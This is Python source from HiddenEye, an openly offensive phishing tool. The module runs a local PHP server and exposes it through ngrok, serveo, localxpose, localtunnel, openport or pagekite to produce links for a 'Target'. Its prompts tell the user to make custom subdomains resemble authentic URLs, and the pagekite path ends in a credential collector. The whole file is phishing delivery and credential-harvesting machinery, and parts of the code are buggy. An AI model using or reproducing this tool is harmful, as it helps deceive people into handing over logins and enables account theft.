#
#    HiddenEye  Copyright (C) 2020  DarkSec https://dark-sec-official.com
#    This program comes with ABSOLUTELY NO WARRANTY; for details read LICENSE.
#    This is free software, and you are welcome to redistribute it
#    under certain conditions; you can read LICENSE for details.
#
import os

import Defs.LocalizationManager.lang_action_manager.lang_server.lang_server_runner as localization
import Defs.LocalizationManager.lang_global_usage as global_localization
import Defs.ThemeManager.theme as theme
from Defs.ActionManager import simple_informant
from Defs.ImportManager.unsorted_will_be_replaced import BytesIO
from Defs.ImportManager.unsorted_will_be_replaced import CalledProcessError
from Defs.ImportManager.unsorted_will_be_replaced import check_output
from Defs.ImportManager.unsorted_will_be_replaced import chmod
from Defs.ImportManager.unsorted_will_be_replaced import DEVNULL
from Defs.ImportManager.unsorted_will_be_replaced import ngrok
from Defs.ImportManager.unsorted_will_be_replaced import ngrok_conf
from Defs.ImportManager.unsorted_will_be_replaced import path
from Defs.ImportManager.unsorted_will_be_replaced import regular_expression
from Defs.ImportManager.unsorted_will_be_replaced import requests
from Defs.ImportManager.unsorted_will_be_replaced import run_background_command
from Defs.ImportManager.unsorted_will_be_replaced import run_command
from Defs.ImportManager.unsorted_will_be_replaced import url_request
from Defs.ImportManager.unsorted_will_be_replaced import wait
from Defs.ImportManager.unsorted_will_be_replaced import ZipFile
from Defs.LocalizationManager.helper import print_sorted_as_menu

try:
    os.mkdir("Server/www")
except FileExistsError:
    pass

default_palette = theme.default_palette


def server_selection(port):  # Question where user must select server
    run_command("clear")
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(localization.lang_server_selection["server_selection"])
    print(localization.lang_server_selection["select_any_available_server"])
    print_sorted_as_menu(localization.lang_server_selection["servers_list"])
    choice = input(global_localization.input_line)
    choice = choice.zfill(2)
    if choice == "00":
        run_command("clear")
        start_localhost(port)  # FIXED
    elif choice == "01":
        run_command("clear")
        start_ngrok(port)  # FIXED
    elif choice == "02":
        run_command("clear")
        start_serveo(port)  # TODO ALMOST FIXED
    elif choice == "03":
        run_command("clear")
        start_localxpose(port)  # TODO DOESN'T GET ENTERED CREDENTIALS BACK
    elif choice == "04":
        run_command("clear")
        start_localtunnel(port, True)
    elif choice == "05":
        run_command("clear")
        start_openport(port)
    elif choice == "06":
        run_command("clear")
        start_pagekite(port)
    else:
        run_command("clear")
        return server_selection(port)


def set_php(host="127.0.0.1", port=80):
    run_command(["killall", "-2", "php"], stdout=DEVNULL, stderr=DEVNULL)
    run_background_command(
        ["php", "-S", "{0}:{1}".format(host, port), "-t", "Server/www"],
        stdout=DEVNULL,
        stderr=DEVNULL,
    )


def set_port(port=80):
    run_background_command(["fuser", "-k", "{0}/tcp".format(port)],
                           stdout=DEVNULL,
                           stderr=DEVNULL)


def start_server(port=80):
    set_php(port=port)


def start_localhost(port):
    run_command("clear")

    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)
    print(localization.lang_start_localhost["localhost_server"])
    host = "127.0.0.1"
    print(localization.lang_start_localhost["your_localhost_is"] + host)
    set_port()

    set_php(host, port)
    print(localization.lang_start_localhost["starting_server_on_addr"] +
          "{0}:{1}".format(host, port))
    run_command("clear")

    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)
    print(localization.lang_start_localhost["running_localhost_server"])

    print(localization.lang_start_localhost["send_this_url_suggestion"])
    print(localization.lang_start_localhost["localhost_url"] +
          "{0}:{1}\n".format(host, port))


def start_ngrok(port):
    ngrok_conf.PyngrokConfig(config_path=".config/ngrok.yml")
    run_command(["killall", "-2", "ngrok"], stdout=DEVNULL, stderr=DEVNULL)
    run_command("clear")
    print(global_localization.hidden_eye_logo)
    print(global_localization.official_website_link)
    print(global_localization.by_darksec)
    print(global_localization.line_of_dots)
    print(localization.lang_start_ngrok["ngrok_server"])
    ngrok.connect(port=int(port))
    while True:
        wait(2)
        ngrok_tunnels = ngrok.get_tunnels()
        url = ngrok_tunnels[0].public_url
        if regular_expression.match("https://[0-9a-z]*\.ngrok.io",
                                    url) is not None:
            print(localization.lang_start_ngrok["send_this_url_suggestion"])
            print(localization.lang_start_localhost["localhost_url"] +
                  "127.0.0.1:" + port)
            print(localization.lang_start_ngrok["ngrok_url"] + url +
                  default_palette[4])
            break


def start_serveo(port):
    def is_online():
        serveo = requests.get("http://serveo.net")
        if "temporarily disabled" in serveo.text:
            return False
        return True

    def random(port):
        run_command("clear")
        print(global_localization.hidden_eye_logo)
        print(global_localization.official_website_link)
        print(global_localization.by_darksec)
        print(global_localization.line_of_dots)
        print(localization.lang_start_serveo["serveo_random_server"])

        run_command(
            [
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "ServerAliveInterval=60",
                "-R",
                "localhost:{0}".format(port),
                "serveo.net",
                ">",
                "link.url",
            ],
            stdout=DEVNULL,
            stderr=DEVNULL,
        )
        wait(8)
        try:
            output = check_output("grep -o '.\{0,0\}http.\{0,100\}' link.url",
                                  shell=True)
            url = output.decode("utf-8")
            print(localization.lang_start_serveo["send_this_url_suggestion"])
            print(localization.lang_start_localhost["localhost_url"] +
                  "127.0.0.1:" + port)
            print(localization.lang_start_serveo["serveo_url"] + url +
                  default_palette[4])
        except CalledProcessError:
            wait(4)
            run_command("clear")
            return random(port)

    def custom(port):
        print(global_localization.hidden_eye_logo)
        print(global_localization.official_website_link)
        print(global_localization.by_darksec)
        print(global_localization.line_of_dots)
        print(localization.lang_start_serveo["serveo_custom_server"])
        print(localization.
              lang_start_serveo["make_url_simmilar_to_real_suggestion"])
        print(localization.lang_start_serveo["insert_custom_subdomain"])
        lnk = input(global_localization.input_line)
        run_background_command(
            [
                "ssh",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "ServerAliveInterval=60",
                "-o",
                "ServerAliveCountMax=60",
                "-R",
                "{0}:80:localhost:{1}".format(lnk, port),
                "serveo.net",
                ">",
                "link.url",
            ],
            stdout=DEVNULL,
            stderr=DEVNULL,
        )
        lnk += ".serveousercontent.com"
        wait(7)
        try:
            run_command("clear")
            print(global_localization.hidden_eye_logo)
            print(global_localization.official_website_link)
            print(global_localization.by_darksec)
            print(global_localization.line_of_dots)
            print(localization.lang_start_serveo["serveo_custom_server"])
            print(localization.lang_start_serveo["send_this_url_suggestion"])
            print(localization.lang_start_localhost["localhost_url"] +
                  "127.0.0.1:" + port)
            print(localization.lang_start_serveo["serveo_url"] + lnk +
                  default_palette[4])

            print("\n")

        except CalledProcessError:
            print(localization.lang_start_serveo["failed_to_get_domain"])
            print(localization.lang_start_serveo["suggestion_to_fix_issue"])
            print(localization.
                  lang_start_serveo["you_can_try_to_select_other_domain"])
            wait(4)
            run_command("clear")
            return custom(port)

    if is_online:
        print(global_localization.hidden_eye_logo)
        print(global_localization.official_website_link)
        print(global_localization.by_darksec)
        print(global_localization.line_of_dots)
        print(localization.lang_start_serveo["serveo_url_option_selection"])
        print(localization.lang_start_serveo["serveo_phishing_warning"])
        print(localization.lang_start_serveo["choose_type_of_url"])
        print_sorted_as_menu(localization.lang_start_serveo["url_types"])
        choice = input(global_localization.input_line)
        run_command("clear")
        if choice == "1":

            custom(port)
        elif choice == "2":
            random(port)
        else:
            run_command("clear")
            return start_serveo(port)
    else:
        print(localization.lang_start_serveo["serveo_is_down"])
        choice = input("HiddenEye >> ")
        choice = choice.lower()
        if choice == "y":
            return server_selection(port)
        else:
            return start_serveo(port)


def start_localxpose(port):
    localxpose_file = "External_Software/loclx"
    localxpose_url = (
        "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm64.zip"
    )
    if path.isfile(localxpose_file):
        pass
    else:
        if simple_informant.check_platform(
                "system") == "Linux" and simple_informant.check_platform(
                    "architecture" is "x86_64"):
            localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-amd64.zip"
        elif simple_informant.check_platform(
                "system") == "Linux" and simple_informant.check_platform(
                    "architecture" is "aarch64"):
            localxpose_url = "https://lxpdownloads.sgp1.digitaloceanspaces.com/cli/loclx-linux-arm64.zip"
        with url_request.urlopen(localxpose_url) as loclxzip:
            with ZipFile(BytesIO(loclxzip.read())) as zip_file:
                zip_file.extractall("External_Software")
        chmod("External_Software/loclx", 0o777)

    def random(port):
        run_command("clear")
        print(global_localization.hidden_eye_logo)
        print(global_localization.official_website_link)
        print(global_localization.by_darksec)
        print(global_localization.line_of_dots)
        print(localization.lang_rand_localxpose["localxpose_random_server"])
        run_command(
            [
                "External_Software/loclx",
                "tunnel",
                "http",
                "--to",
                ":{0}".format(port),
                ">",
                "link.url",
            ],
            stdout=DEVNULL,
            stderr=DEVNULL,
        )
        try:
            output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",
                                  shell=True)
            url = output.decode("utf-8")
            print(
                "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO Target-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}{4}{1}"
                .format(
                    default_palette[0],
                    default_palette[4],
                    default_palette[3],
                    port,
                    url,
                ) + "{0}".format(default_palette[4]))
            print("\n")
        except CalledProcessError:

            wait(4)
            run_command("clear")
            return random(port)

    def custom(port):

        print(global_localization.small_logo)
        print(
            """\n\n-------------------------------\n{0}[ CREATE A CUSTOM URL HERE ]{1}!! {0}\n-------------------------------\n\n{0}[{1}!{0}]{1} YOU CAN MAKE YOUR URL SIMILAR TO AUTHENTIC URL.\n\n{0}Insert a custom subdomain for Localxpose(Ex: mysubdomain)"""
            .format(default_palette[0], default_palette[2]))
        lnk = input("\n{0}CUSTOM Subdomain>>> {1}".format(
            default_palette[0], default_palette[2]))
        run_command(
            "./Server/loclx tunnel http --to :%s --subdomain %s > link.url 2> /dev/null &"
            % (port, lnk))
        wait(7)
        try:
            output = check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",
                                  shell=True)
            url = output.decode("utf-8")
            run_command("clear")
            print("""
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC  \n\n-------------------------------\n{0}[ CUSTOM SERVEO URL ]{1}!! {0}\n-------------------------------"""
                  .format(default_palette[0], default_palette[2]))
            print(
                "\n{0}[{1}!{0}]{1} SEND THIS LOCALXPOSE URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALXPOSE URL: {2}"
                .format(default_palette[0], default_palette[2],
                        default_palette[3], port) + url +
                "{0}".format(default_palette[4]))
            print("\n")

        except CalledProcessError:
            print(
                """\n\n{0}FAILED TO GET THIS DOMAIN. !!!\n\n{0}LOOKS LIKE CUSTOM URL IS NOT VALID or ALREADY OCCUPIED BY SOMEONE ELSE. !!!\n\n{0}[{1}!{0}]TRY TO SELECT ANOTHER CUSTOM DOMAIN{1} (GOING BACK).. !! \n"""
                .format(default_palette[0], default_palette[4]))
            wait(4)
            run_command("clear")
            return custom(port)

    print("""
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALXPOSE URL TYPE SELECTION ]{1}!! {0}\n-------------------------------\n"""
          .format(default_palette[0], default_palette[2]))
    print(
        "\n{0}[{1}*{0}]{0}CHOOSE ANY LOCALXPOSE URL TYPE TO GENERATE PHISHING LINK:{1}"
        .format(default_palette[0], default_palette[2]))
    print(
        "\n{0}[{1}1{0}]{1}Custom URL {0}(Generates designed url) \n{0}[{1}2{0}]{1}Random URL {0}(Generates Random url)"
        .format(default_palette[0], default_palette[2]))
    choice = input("\n\n{0}YOUR CHOICE >>> {1}".format(default_palette[0],
                                                       default_palette[2]))
    run_command("clear")
    if choice == "1":

        custom(port)
    elif choice == "2":
        random(port)
    else:
        run_command("clear")
        return start_localxpose(port)


def start_localtunnel(port, npm):
    run_command("clear")
    print("""
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL  ]{1}!! {0}\n-------------------------------"""
          .format(default_palette[0], default_palette[2]))
    print("\n{0}[{1}*{0}]{0}SELECT ANY URL TYPE TO GENERATE PHISHING LINK:{1}".
          format(default_palette[0], default_palette[2]))
    print(
        "\n{0}[{1}+{0}]{1}Type Subdomain for Custom URL. \n{0}[{1}+{0}]{1}Leave Empty For Random URL"
        .format(default_palette[0], default_palette[2]))
    s = input("\n{0}(Localtunnel/Subdomain)> {1}".format(
        default_palette[0], default_palette[2]))
    try:
        run_command("{0}lt -p ".format("" if npm else "Server/") + port +
                    ((" -s " + s) if s != "" else s) + " > link.url &")
        wait(3)
        run_command("clear")
        print("""
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------"""
              .format(default_palette[0], default_palette[2]))
        print(
            "\n{0}[{1}!{0}]{1} SEND THIS SERVEO URL TO Target-\n\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} LOCALTUNNEL URL: {2}{4}"
            .format(
                default_palette[0],
                default_palette[2],
                default_palette[3],
                port,
                str(
                    check_output("grep -o '.\{0,0\}https.\{0,100\}' link.url",
                                 shell=True)).strip("b ' \ n r"),
            ))
    except CalledProcessError:
        run_command("clear")
        print("""
        {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
        |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
        |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
        {0}http://github.com/darksecdevelopers
        {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ LOCALTUNNEL URL ]{1}!! {0}\n-------------------------------"""
              .format(default_palette[0], default_palette[2]))
        print("{0}error[invalid/preoccupied]{0}".format(default_palette[0]))
        start_localtunnel(port, npm)


def start_openport(port):
    run_command("clear")

    def manage_url(port):
        run_command("rm output.txt > /dev/null 2>&1")
        run_command("openport -K && openport %s > output.txt &" % (port))
        print(
            "{0}[{1}*{0}] {1}Openport Server Running in Background.. Please wait."
            .format(default_palette[0], default_palette[4]))
        # Sleep time is important as the openport command takes some time to give response link.
        wait(20)
        run_command(
            'cat output.txt | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | sort -u | grep -v https://openport.io/user > openport.txt'
        )  # Taking out the neccesary verification link from output txt file of openport (above).
        print(
            "{0}[{1}*{0}] {1}Working To Get OpenPort Tunnel Activation Link..."
            .format(default_palette[0], default_palette[4]))
        with open("openport.txt") as f:
            read_data = f.read()
            if "openport.io/l/" in read_data:
                print("{0}[{1}*{0}] {1}Got Activation Link...".format(
                    default_palette[0], default_palette[4]))
            else:
                print(
                    "{0}[{1}^{0}] {1}Failed To Get Openport Activation Link... "
                    .format(default_palette[0], default_palette[4]))
                output = open("output.txt", "r")
                output = output.read()
                print("{0}[{1}!{0}] {1}Openport Error:\n\n{2}".format(
                    default_palette[0], default_palette[4], output))
                input("\n\n{0}[{1}*{0}] {1}Try Other Tunnels... (Press Enter)".
                      format(default_palette[0], default_palette[4]))
                server_selection(port)

        urlFile = open("openport.txt", "r")
        urltoverify = urlFile.read().strip()
        print(
            "{0}[{1}*{0}] {1}Open This Activation Link From Browser to Get Tunnel Link...\n"
            .format(default_palette[0], default_palette[4]))
        print("{0}[{1}*{0}] {1}Tunnel Activation Link:{0}{2} ".format(
            default_palette[0], default_palette[4], urltoverify))
        url = input(
            "\n\n{0}[{1}*{0}] {1}Enter The Tunnel Link Found in Browser: {0} ".
            format(default_palette[0], default_palette[4]))
        wait(4)
        run_command("clear")
        print("""
	    {1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
	    |__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
	    |  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
	    {0}http://github.com/darksecdevelopers
	    {0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
              .format(default_palette[0], default_palette[4]))
        print(
            "\n{0}[{1}!{0}]{1} SEND THIS OPENPORT URL TO Target-\n{0}[{1}*{0}]{1} Localhost URL: {2}http://127.0.0.1:{3}\n{0}[{1}*{0}]{1} OPENPORT URL: {2}{4}\n"
            .format(default_palette[0], default_palette[4], default_palette[3],
                    port, url))

    print("""{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
		{0}http://github.com/darksecdevelopers
		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ OPENPORT SERVER ]{1}!! {0}\n-------------------------------"""
          .format(default_palette[0], default_palette[2]))
    if 256 == run_command("which openport > /dev/null"):
        run_command("clear")
        print(
            "[*] Openport not Installed correctly, Try installing it manually !!"
        )
        print("[*] Check Here ... https://openport.io/download")
        input("\n Press Enter To Go back..")
        server_selection(port)
    else:
        manage_url(port)


def start_pagekite(port):
    from Defs.ActionManager.simple_informant import credentials_collector

    run_command("clear")
    print("""
		{1}_  _ . ___  ___  ___ _  _  {0}___ _  _ ___{1}
		|__| | ]  | ]  | |__ |\ |  {0}|__ \__/ |__{1}
		|  | | ]__| ]__| |__ | \|  {0}|__  ||  |__{1}
		{0}http://github.com/darksecdevelopers
		{0}** BY:DARKSEC ** \n\n-------------------------------\n{0}[ PAGEKITE SERVER ]{1}!! {0}\n-------------------------------"""
          .format(default_palette[0], default_palette[2]))
    if 256 == run_command("which python2 > /dev/null"):
        print("[*] Python2 not Installed, Pagekite Only Supports Python2!!")
        input("\n Press Enter To Try installing Python2 Now..")
        run_command("apt install python2")
        if 256 == run_command("which python2 > /dev/null"):
            run_command("clear")
            print(
                "\n{0}[{1}*{0}] {1}FAILED TO INSTALL PYTHON2 (TRY MANUALLY)..{1}"
                .format(default_palette[0], default_palette[4]))
            wait(2)
            server_selection(port)
        else:
            pass
    else:
        try:
            subdomain = input(
                "\n{0}[{1}*{0}] {0}Enter A Custom Subdomain Ex.(yourname):\n{0}Custom Subdomain>>> {1}"
                .format(default_palette[0], default_palette[2]))
            print(
                "\n{0}[{1}*{0}] {1}Use Temporary Email Services(Don't Harm Anyone).{1}"
                .format(default_palette[0], default_palette[4]))
            print(
                "{0}[{1}*{0}] {1}Sometime Email verification Required by Pagekite(Stay Alert){1}"
                .format(default_palette[0], default_palette[4]))
            print(
                "{0}[{1}*{0}] {1}You can also get various subdomain assigned to your subdomain.{1}"
                .format(default_palette[0], default_palette[4]))
            print(
                "{0}[{1}*{0}] {1}Check Control Panel Of pagekite at https://pagekite.net/ .{1}"
                .format(default_palette[0], default_palette[4]))
            print(
                "{0}[{1}*{0}] {1}We are Ready to Launch Pagekite.Press CTRL+C Whenever Need captured Data.{1}"
                .format(default_palette[0], default_palette[4]))
            input("\n{0}[{1}*{0}] {0}Press Enter To Launch The Pagekite...{1}".
                  format(default_palette[0], default_palette[4]))
            run_command(
                "python2 Server/pagekite.py --clean --signup {0} {1}.pagekite.me"
                .format(port, subdomain))
        except KeyboardInterrupt:
            print("[!] Please Copy the Generated Link For Further Use")
            credentials_collector(port)
